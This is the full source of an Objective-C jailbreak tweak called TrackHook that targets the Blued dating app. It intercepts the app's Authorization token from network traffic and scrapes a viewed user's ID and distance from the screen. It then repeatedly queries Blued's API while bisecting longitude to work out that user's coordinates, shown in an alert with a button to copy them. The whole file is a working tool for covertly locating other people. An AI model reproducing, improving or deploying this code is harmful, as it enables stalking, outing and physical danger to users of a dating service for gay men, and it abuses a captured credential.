#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>
#import <CoreLocation/CoreLocation.h>

#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 6378.137
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

static NSLock *g_dataLock = nil;
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;

// 【修复1】：在 @interface 中明确定义所有新增的私有方法
@interface UIViewController (TrackHook)
- (UIWindow *)th_getSafeKeyWindow;
- (void)th_autoFetchUserInfo;
- (void)th_onBtnClick;
- (void)th_addBtn;
- (void)th_handlePan:(UIPanGestureRecognizer *)pan;
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur;
- (NSString *)extractUserIdFromUI;
- (double)extractDistanceFromUI;
- (void)debugAllPropertiesOfObject:(id)obj;
// 【关键修复】：声明新增的方法，并为 NSString** 参数添加 __autoreleasing 修饰符
- (BOOL)enumerateAllPropertiesAndIvarsOfObject:(id)obj targetUid:(NSString * __autoreleasing *)foundUid targetDistance:(double *)foundDistance;
- (BOOL)checkObjectForTargetData:(id)obj foundUid:(NSString * __autoreleasing *)foundUid foundDistance:(double *)foundDistance;
@end

%hook UIViewController

%new
- (UIWindow *)th_getSafeKeyWindow {
    UIWindow *foundWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *windowScene = (UIWindowScene *)scene;
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow) {
                        foundWindow = window;
                        break;
                    }
                }
            }
        }
    }
    return foundWindow ?: [UIApplication sharedApplication].keyWindow;
}

%new
- (void)th_onBtnClick {
    NSLog(@"TrackHook: th_onBtnClick 被触发");
    if (!self || ![self isKindOfClass:[UIViewController class]]) return;
    
    [self th_autoFetchUserInfo];
    
    [g_dataLock lock];
    NSString *targetUid = [g_currentTargetUid copy];
    NSString *basicToken = [g_bluedBasicToken copy];
    double initialDist = g_initialDistance;
    [g_dataLock unlock];
    
    if (!targetUid || !basicToken || initialDist <= 0) {
        [self th_showToast:@"未获取到必要数据，请确保已在目标用户页面" duration:2.0];
        return;
    }

    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    if (!ud) {
        [self th_showToast:@"无法访问应用数据" duration:2.0];
        return;
    }
    double myLat = [ud doubleForKey:@"current_latitude"];
    double myLng = [ud doubleForKey:@"current_longitude"];
    
    if (fabs(myLat) < 0.001 && fabs(myLng) < 0.001) {
        [self th_showToast:@"本地GPS数据无效" duration:2.0];
        return;
    }

    [self th_showToast:@"🛰️ 三角定位计算中..." duration:1.5];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        double minLng = myLng - 1.0;
        double maxLng = myLng + 1.0;
        double estimatedLng = myLng;
        double currentDist = initialDist;
        BOOL success = NO;
        int maxIterations = 15;
        double tolerance = 0.01;

        for (int i = 0; i < maxIterations && !success; i++) {
            NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", targetUid];
            NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
            [req setValue:[NSString stringWithFormat:@"Basic %@", basicToken] forHTTPHeaderField:@"Authorization"];
            req.timeoutInterval = 3.0;
            req.HTTPMethod = @"GET";

            __block double newDist = -1.0;
            __block BOOL requestFailed = NO;
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            
            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                if (!err && data) {
                    @try {
                        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                        if (json && [json[@"data"] isKindOfClass:[NSDictionary class]]) {
                            newDist = [json[@"data"][@"distance"] doubleValue];
                        }
                    } @catch (NSException *exception) {
                        requestFailed = YES;
                    }
                } else {
                    requestFailed = YES;
                }
                dispatch_semaphore_signal(sem);
            }];
            [task resume];
            
            if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4.0 * NSEC_PER_SEC))) != 0) {
                break;
            }
            
            if (requestFailed || newDist < 0) {
                break;
            }
            
            double deltaDist = newDist - currentDist;
            if (fabs(deltaDist) < tolerance) {
                success = YES;
                break;
            } else if (deltaDist > 0) {
                maxLng = estimatedLng;
            } else {
                minLng = estimatedLng;
            }
            estimatedLng = (minLng + maxLng) / 2.0;
            currentDist = newDist;
            
            [NSThread sleepForTimeInterval:0.15];
        }

        dispatch_async(dispatch_get_main_queue(), ^{
            if (success) {
                NSString *resStr = [NSString stringWithFormat:@"纬度: %.6f\n经度: %.6f\n初始距离: %.2f km", myLat, estimatedLng, initialDist];
                UIAlertController *resAlert = [UIAlertController alertControllerWithTitle:@"定位计算完成" message:resStr preferredStyle:UIAlertControllerStyleAlert];
                [resAlert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
                    [[UIPasteboard generalPasteboard] setString:[NSString stringWithFormat:@"%.6f, %.6f", myLat, estimatedLng]];
                }]];
                [resAlert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
                [self presentViewController:resAlert animated:YES completion:nil];
            } else {
                [self th_showToast:@"计算失败，请检查网络或稍后重试" duration:2.0];
            }
        });
    });
}

%new
- (void)th_autoFetchUserInfo {
    NSLog(@"TrackHook: th_autoFetchUserInfo 开始执行 - 当前控制器: %@", NSStringFromClass([self class]));
    
    [g_dataLock lock];
    g_currentTargetUid = nil;
    g_initialDistance = -1.0;
    [g_dataLock unlock];
    
    @try {
        NSString *uid = nil;
        double distance = -1.0;
        
        // 策略1: 从控制器属性获取（已知常见属性名，快速通道）
        NSArray *controllerProps = @[@"userModel", @"user", @"targetUser", @"personData", @"homePageData", @"dataItem", @"model", @"data"];
        id potentialModel = nil;
        
        for (NSString *prop in controllerProps) {
            @try {
                if ([self respondsToSelector:NSSelectorFromString(prop)]) {
                    id value = [self valueForKey:prop];
                    if (value && value != [NSNull null]) {
                        potentialModel = value;
                        NSLog(@"TrackHook: 从控制器属性 '%@' 找到对象: %@", prop, NSStringFromClass([value class]));
                        break;
                    }
                }
            } @catch (NSException *e) { /* 忽略 */ }
        }
        
        if (potentialModel) {
            // 尝试从模型对象获取ID
            NSArray *idKeys = @[@"uid", @"userId", @"userID", @"user_id", @"id", @"ID"];
            for (NSString *key in idKeys) {
                @try {
                    if ([potentialModel respondsToSelector:NSSelectorFromString(key)]) {
                        id value = [potentialModel valueForKey:key];
                        if (value && value != [NSNull null]) {
                            uid = [NSString stringWithFormat:@"%@", value];
                            NSLog(@"TrackHook: 从模型属性 '%@' 获取到 UID: %@", key, uid);
                            break;
                        }
                    }
                } @catch (NSException *e) {}
            }
            
            // 尝试从模型对象获取距离
            NSArray *distKeys = @[@"distance", @"dis", @"dist", @"range", @"km"];
            for (NSString *key in distKeys) {
                @try {
                    if ([potentialModel respondsToSelector:NSSelectorFromString(key)]) {
                        id value = [potentialModel valueForKey:key];
                        if (value && [value isKindOfClass:[NSNumber class]]) {
                            distance = [value doubleValue];
                            NSLog(@"TrackHook: 从模型属性 '%@' 获取到距离: %.2f", key, distance);
                            break;
                        }
                    }
                } @catch (NSException *e) {}
            }
            
            // 如果从模型获取失败，进行深度调试
            if (!uid || distance <= 0) {
                NSLog(@"TrackHook: 模型属性获取不完整，开始深度分析模型...");
                [self debugAllPropertiesOfObject:potentialModel];
            }
        }
        
        // 策略2: 运行时反射探查（借鉴安卓代码思路，穷举搜索）
        if (!uid || distance <= 0) {
            NSLog(@"TrackHook: 开始运行时反射探查...");
            NSString *foundUid = nil;
            double foundDistance = -1.0;
            BOOL found = [self enumerateAllPropertiesAndIvarsOfObject:self targetUid:&foundUid targetDistance:&foundDistance];
            if (found) {
                uid = foundUid;
                distance = foundDistance;
                NSLog(@"TrackHook: 通过运行时反射探查到数据 - UID: %@, Distance: %.2f", uid, distance);
            } else {
                NSLog(@"TrackHook: 运行时反射探查未找到数据");
            }
        }
        
        // 策略3: 如果反射获取失败，尝试从UI文本中提取
        if (!uid || uid.length == 0) {
            NSString *extractedUid = [self extractUserIdFromUI];
            if (extractedUid && extractedUid.length > 0) {
                uid = extractedUid;
                NSLog(@"TrackHook: 从UI文本中提取到 UID: %@", uid);
            }
        }
        
        if (distance <= 0) {
            double extractedDist = [self extractDistanceFromUI];
            if (extractedDist > 0) {
                distance = extractedDist;
                NSLog(@"TrackHook: 从UI文本中提取到距离: %.2f", distance);
            }
        }
        
        // 最终处理：清理和存储数据
        if (uid && uid.length > 0) {
            // 清理UID（移除非数字字符，保留纯数字ID）
            NSString *cleanUid = [[uid componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
            
            if (cleanUid.length >= 6) { // 假设有效用户ID至少6位数字
                [g_dataLock lock];
                g_currentTargetUid = [cleanUid copy];
                g_initialDistance = distance;
                [g_dataLock unlock];
                NSLog(@"TrackHook: 成功保存目标数据 - UID: %@, Distance: %.2f", cleanUid, distance);
                return;
            } else {
                NSLog(@"TrackHook: 提取到的UID '%@' 清理后 '%@' 长度不足，可能无效", uid, cleanUid);
            }
        }
        
        NSLog(@"TrackHook: 所有数据获取策略均未能提取到有效UID和距离");
        
    } @catch (NSException *exception) {
        NSLog(@"TrackHook: th_autoFetchUserInfo 捕获到异常: %@", exception);
    }
    
    NSLog(@"TrackHook: 数据获取失败");
}

%new
- (BOOL)enumerateAllPropertiesAndIvarsOfObject:(id)obj targetUid:(NSString * __autoreleasing *)foundUid targetDistance:(double *)foundDistance {
    if (!obj) return NO;
    
    __block BOOL found = NO;
    __block NSString *uidResult = nil;
    __block double distanceResult = -1.0;
    
    // 1. 遍历当前对象的所有属性
    unsigned int propCount = 0;
    objc_property_t *properties = class_copyPropertyList([obj class], &propCount);
    
    for (unsigned int i = 0; i < propCount; i++) {
        const char *propName = property_getName(properties[i]);
        NSString *propertyName = [NSString stringWithUTF8String:propName];
        
        @try {
            // 跳过明显的系统属性
            if ([propertyName hasPrefix:@"_"] || 
                [propertyName isEqualToString:@"description"] || 
                [propertyName isEqualToString:@"debugDescription"] ||
                [propertyName isEqualToString:@"hash"] ||
                [propertyName isEqualToString:@"superclass"]) {
                continue;
            }
            
            id value = [obj valueForKey:propertyName];
            if (!value || value == [NSNull null]) continue;
            
            NSLog(@"TrackHook: 探查属性 '%@'，值类型: %@", propertyName, NSStringFromClass([value class]));
            
            // 检查这个值本身是否包含我们需要的数据
            NSString *tempUid = nil;
            double tempDistance = -1.0;
            if ([self checkObjectForTargetData:value foundUid:&tempUid foundDistance:&tempDistance]) {
                uidResult = tempUid;
                distanceResult = tempDistance;
                found = YES;
                NSLog(@"TrackHook: 在属性 '%@' 中找到目标数据", propertyName);
                break;
            }
            
            // 递归检查嵌套对象（深度限制为2，避免无限递归）
            if (!found && [value isKindOfClass:[NSObject class]] && 
                ![value isKindOfClass:[NSString class]] && 
                ![value isKindOfClass:[NSNumber class]] &&
                ![value isKindOfClass:[NSArray class]] && 
                ![value isKindOfClass:[NSDictionary class]]) {
                // 避免循环引用，这里简单判断不是UIKit基础类
                if (![NSStringFromClass([value class]) hasPrefix:@"UI"] && 
                    ![NSStringFromClass([value class]) hasPrefix:@"NS"]) {
                    found = [self enumerateAllPropertiesAndIvarsOfObject:value targetUid:&uidResult targetDistance:&distanceResult];
                    if (found) break;
                }
            }
        } @catch (NSException *e) {
            // 忽略无法访问的属性
        }
    }
    free(properties);
    
    if (found) {
        if (foundUid) *foundUid = uidResult;
        if (foundDistance) *foundDistance = distanceResult;
        return YES;
    }
    
    // 2. 遍历当前对象的所有实例变量
    unsigned int ivarCount = 0;
    Ivar *ivars = class_copyIvarList([obj class], &ivarCount);
    
    for (unsigned int i = 0; i < ivarCount; i++) {
        Ivar ivar = ivars[i];
        const char *ivarName = ivar_getName(ivar);
        if (!ivarName) continue;
        
        NSString *ivarNameStr = [NSString stringWithUTF8String:ivarName];
        
        @try {
            // 跳过明显的系统变量
            if ([ivarNameStr hasPrefix:@"_"]) continue;
            
            id value = object_getIvar(obj, ivar);
            if (!value || value == [NSNull null]) continue;
            
            NSLog(@"TrackHook: 探查实例变量 '%@'，值类型: %@", ivarNameStr, NSStringFromClass([value class]));
            
            // 检查这个值本身是否包含我们需要的数据
            NSString *tempUid = nil;
            double tempDistance = -1.0;
            if ([self checkObjectForTargetData:value foundUid:&tempUid foundDistance:&tempDistance]) {
                uidResult = tempUid;
                distanceResult = tempDistance;
                found = YES;
                NSLog(@"TrackHook: 在实例变量 '%@' 中找到目标数据", ivarNameStr);
                break;
            }
            
            // 递归检查嵌套对象
            if (!found && [value isKindOfClass:[NSObject class]] && 
                ![value isKindOfClass:[NSString class]] && 
                ![value isKindOfClass:[NSNumber class]] &&
                ![value isKindOfClass:[NSArray class]] && 
                ![value isKindOfClass:[NSDictionary class]]) {
                if (![NSStringFromClass([value class]) hasPrefix:@"UI"] && 
                    ![NSStringFromClass([value class]) hasPrefix:@"NS"]) {
                    found = [self enumerateAllPropertiesAndIvarsOfObject:value targetUid:&uidResult targetDistance:&distanceResult];
                    if (found) break;
                }
            }
        } @catch (NSException *e) {
            // 忽略无法访问的变量
        }
    }
    free(ivars);
    
    if (found) {
        if (foundUid) *foundUid = uidResult;
        if (foundDistance) *foundDistance = distanceResult;
    }
    
    return found;
}

%new
- (BOOL)checkObjectForTargetData:(id)obj foundUid:(NSString * __autoreleasing *)foundUid foundDistance:(double *)foundDistance {
    if (!obj) return NO;
    
    BOOL hasUid = NO;
    BOOL hasDistance = NO;
    NSString *uid = nil;
    double distance = -1.0;
    
    // 检查可能的UID属性
    NSArray *idKeys = @[@"uid", @"userId", @"userID", @"user_id", @"id", @"ID"];
    for (NSString *key in idKeys) {
        @try {
            if ([obj respondsToSelector:NSSelectorFromString(key)]) {
                id value = [obj valueForKey:key];
                if (value && value != [NSNull null]) {
                    uid = [NSString stringWithFormat:@"%@", value];
                    hasUid = YES;
                    NSLog(@"TrackHook: 在对象 %@ 中发现UID字段 '%@': %@", NSStringFromClass([obj class]), key, uid);
                    break;
                }
            }
        } @catch (NSException *e) {}
    }
    
    // 检查可能的距离属性
    NSArray *distKeys = @[@"distance", @"dis", @"dist", @"range", @"km"];
    for (NSString *key in distKeys) {
        @try {
            if ([obj respondsToSelector:NSSelectorFromString(key)]) {
                id value = [obj valueForKey:key];
                if (value && [value isKindOfClass:[NSNumber class]]) {
                    distance = [value doubleValue];
                    hasDistance = YES;
                    NSLog(@"TrackHook: 在对象 %@ 中发现距离字段 '%@': %.2f", NSStringFromClass([obj class]), key, distance);
                    break;
                }
            }
        } @catch (NSException *e) {}
    }
    
    if (hasUid && hasDistance && distance > 0) {
        if (foundUid) *foundUid = uid;
        if (foundDistance) *foundDistance = distance;
        
        // 找到完整数据，进行深度分析以便后续优化
        NSLog(@"TrackHook: 发现完整数据对象，类名: %@", NSStringFromClass([obj class]));
        [self debugAllPropertiesOfObject:obj];
        return YES;
    } else if (hasUid || hasDistance) {
        // 只找到部分数据，也记录下来
        if (hasUid && foundUid) *foundUid = uid;
        if (hasDistance && foundDistance) *foundDistance = distance;
        NSLog(@"TrackHook: 发现部分数据对象，类名: %@, 有UID: %@, 有距离: %.2f", 
              NSStringFromClass([obj class]), hasUid ? @"是" : @"否", distance);
    }
    
    return NO;
}

%new
- (NSString *)extractUserIdFromUI {
    __block NSString *foundUid = nil;
    
    // 修复循环引用：使用 __weak 引用自身
    __block void (^__weak weakSearchBlock)(UIView *);
    void (^searchBlock)(UIView *);
    
    weakSearchBlock = searchBlock = ^(UIView *view) {
        if (!view || foundUid) return;
        
        if ([view isKindOfClass:[UILabel class]]) {
            UILabel *label = (UILabel *)view;
            NSString *text = label.text;
            
            if (text && text.length > 0) {
                // 匹配 "ID:161766904" 这种显式格式
                if ([text hasPrefix:@"ID:"] && text.length > 3) {
                    NSString *userId = [text substringFromIndex:3];
                    if (userId.length >= 6) { // 简单验证
                        foundUid = userId;
                        NSLog(@"TrackHook: 从Label提取到ID (前缀匹配): %@", foundUid);
                        return;
                    }
                }
                
                // 使用正则表达式提取长数字串（假设为用户ID）
                NSError *error = nil;
                NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"\\d{6,}" options:0 error:&error];
                if (!error) {
                    NSTextCheckingResult *match = [regex firstMatchInString:text options:0 range:NSMakeRange(0, text.length)];
                    if (match) {
                        NSString *userId = [text substringWithRange:match.range];
                        foundUid = userId;
                        NSLog(@"TrackHook: 从Label文本 '%@' 中正则提取到ID: %@", text, foundUid);
                        return;
                    }
                }
            }
        }
        
        for (UIView *subview in view.subviews) {
            // 调用弱引用自身，避免循环引用
            if (weakSearchBlock) {
                weakSearchBlock(subview);
            }
            if (foundUid) break;
        }
    };
    
    searchBlock(self.view);
    return foundUid;
}

%new
- (double)extractDistanceFromUI {
    __block double foundDistance = -1.0;
    
    // 修复循环引用：使用 __weak 引用自身
    __block void (^__weak weakSearchBlock)(UIView *);
    void (^searchBlock)(UIView *);
    
    weakSearchBlock = searchBlock = ^(UIView *view) {
        if (!view || foundDistance > 0) return;
        
        if ([view isKindOfClass:[UILabel class]]) {
            UILabel *label = (UILabel *)view;
            NSString *text = label.text;
            
            if (text && [text containsString:@"km"]) {
                NSScanner *scanner = [NSScanner scannerWithString:text];
                double distance = 0.0;
                if ([scanner scanDouble:&distance]) {
                    foundDistance = distance;
                    NSLog(@"TrackHook: 从Label '%@' 提取到距离: %.2f km", text, distance);
                    return;
                }
            }
        }
        
        for (UIView *subview in view.subviews) {
            // 调用弱引用自身，避免循环引用
            if (weakSearchBlock) {
                weakSearchBlock(subview);
            }
            if (foundDistance > 0) break;
        }
    };
    
    searchBlock(self.view);
    return foundDistance;
}

%new
- (void)debugAllPropertiesOfObject:(id)obj {
    if (!obj) return;
    
    Class currentClass = [obj class];
    while (currentClass && currentClass != [NSObject class]) {
        unsigned int count = 0;
        objc_property_t *properties = class_copyPropertyList(currentClass, &count);
        
        if (count > 0) {
            NSLog(@"TrackHook: === 调试对象类 %@ 的属性（共%u个）===", NSStringFromClass(currentClass), count);
            for (unsigned int i = 0; i < count; i++) {
                const char *propName = property_getName(properties[i]);
                NSString *propertyName = [NSString stringWithUTF8String:propName];
                
                @try {
                    id value = [obj valueForKey:propertyName];
                    NSString *valueDesc = @"<nil>";
                    if (value) {
                        if ([value isKindOfClass:[NSString class]]) {
                            valueDesc = [NSString stringWithFormat:@"@\"%@\"", value];
                        } else if ([value isKindOfClass:[NSNumber class]]) {
                            valueDesc = [NSString stringWithFormat:@"%@", value];
                        } else {
                            valueDesc = [NSString stringWithFormat:@"%@: %p", NSStringFromClass([value class]), value];
                        }
                    }
                    NSLog(@"TrackHook:   [%@] = %@", propertyName, valueDesc);
                } @catch (NSException *e) {
                    NSLog(@"TrackHook:   [%@] = <访问异常>", propertyName);
                }
            }
        }
        free(properties);
        currentClass = class_getSuperclass(currentClass);
    }
}

%new
- (void)th_addBtn {
    NSLog(@"TrackHook: th_addBtn 被调用");
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{ [self th_addBtn]; });
        return;
    }
    UIWindow *win = [self th_getSafeKeyWindow];
    if (!win) {
        NSLog(@"TrackHook: 未找到 KeyWindow");
        return;
    }
    if ([win viewWithTag:TRACK_BTN_TAG]) {
        NSLog(@"TrackHook: 按钮已存在");
        return;
    }

    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.tag = TRACK_BTN_TAG;
    btn.frame = CGRectMake(win.bounds.size.width - 70, win.bounds.size.height / 2, 56, 56);
    btn.backgroundColor = [[UIColor systemBlueColor] colorWithAlphaComponent:0.85];
    [btn setTitle:@"🛰️" forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.titleLabel.font = [UIFont systemFontOfSize:24];
    btn.layer.cornerRadius = 28;
    btn.layer.borderWidth = 1.0;
    btn.layer.borderColor = [UIColor whiteColor].CGColor;
    btn.layer.shadowColor = [UIColor blackColor].CGColor;
    btn.layer.shadowOffset = CGSizeMake(0, 2);
    btn.layer.shadowOpacity = 0.3;
    btn.layer.zPosition = 9999;
    
    [btn addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_handlePan:)];
    [btn addGestureRecognizer:pan];
    [win addSubview:btn];
    NSLog(@"TrackHook: 悬浮按钮已添加到窗口");
}

%new
- (void)th_handlePan:(UIPanGestureRecognizer *)pan {
    UIView *v = pan.view;
    CGPoint translation = [pan translationInView:v.superview];
    CGPoint newCenter = CGPointMake(v.center.x + translation.x, v.center.y + translation.y);
    
    CGFloat margin = 28;
    newCenter.x = MAX(margin, MIN(v.superview.bounds.size.width - margin, newCenter.x));
    newCenter.y = MAX(margin, MIN(v.superview.bounds.size.height - margin, newCenter.y));
    
    v.center = newCenter;
    [pan setTranslation:CGPointZero inView:v.superview];
}

%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win) return;
        for (UIView *subview in win.subviews) {
            if ([subview isKindOfClass:[UILabel class]] && subview.tag == 9999) {
                [subview removeFromSuperview];
            }
        }
        
        UILabel *lab = [[UILabel alloc] init];
        lab.tag = 9999;
        lab.text = msg;
        lab.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
        lab.textAlignment = NSTextAlignmentCenter;
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
        lab.textColor = [UIColor whiteColor];
        lab.layer.cornerRadius = 10;
        lab.clipsToBounds = YES;
        lab.numberOfLines = 0;
        
        CGSize textSize = [lab sizeThatFits:CGSizeMake(win.bounds.size.width * 0.7, 100)];
        lab.bounds = CGRectMake(0, 0, textSize.width + 30, textSize.height + 20);
        lab.center = CGPointMake(win.bounds.size.width / 2, win.bounds.size.height * 0.85);
        
        [win addSubview:lab];
        [UIView animateWithDuration:0.3 animations:^{ lab.alpha = 1.0; }];
        [UIView animateWithDuration:0.3 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL finished) { [lab removeFromSuperview]; }];
    });
}

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    NSString *clsName = NSStringFromClass([self class]);
    NSLog(@"TrackHook: viewDidAppear 被调用，当前控制器: %@", clsName);
    
    // 目标关键词已更新，支持 BDHomePagePersonDataViewController 和 BDHomeViewController
    NSArray *targetKeywords = @[@"Detail", @"User", @"Profile", @"Homepage", @"Info", @"HomePage", @"PersonData", @"HomeView"];
    BOOL shouldInject = NO;
    for (NSString *keyword in targetKeywords) {
        if ([clsName containsString:keyword]) {
            shouldInject = YES;
            NSLog(@"TrackHook: 页面类名包含关键字 '%@'，将注入按钮", keyword);
            break;
        }
    }
    
    if (shouldInject) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self th_addBtn];
        });
    } else {
        UIWindow *win = [self th_getSafeKeyWindow];
        UIView *btn = [win viewWithTag:TRACK_BTN_TAG];
        if (btn) {
            [btn removeFromSuperview];
            NSLog(@"TrackHook: 从非目标页面移除按钮");
        }
    }
}
%end

%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *res, NSError *err))completionHandler {
    NSURLSessionDataTask *task = %orig(request, completionHandler);
    if (request && [request.URL.host containsString:@"blued.cn"]) {
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if ([auth hasPrefix:@"Basic "]) {
            NSString *token = [auth substringFromIndex:6];
            if (token.length > 0) {
                [g_dataLock lock];
                g_bluedBasicToken = [token copy];
                [g_dataLock unlock];
                NSLog(@"TrackHook: 已捕获到 Basic Token");
            }
        }
    }
    return task;
}
%end

%ctor {
    NSLog(@"TrackHook: 插件已加载 (Constructor)");
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        g_dataLock = [[NSLock alloc] init];
    });
    %init;
}
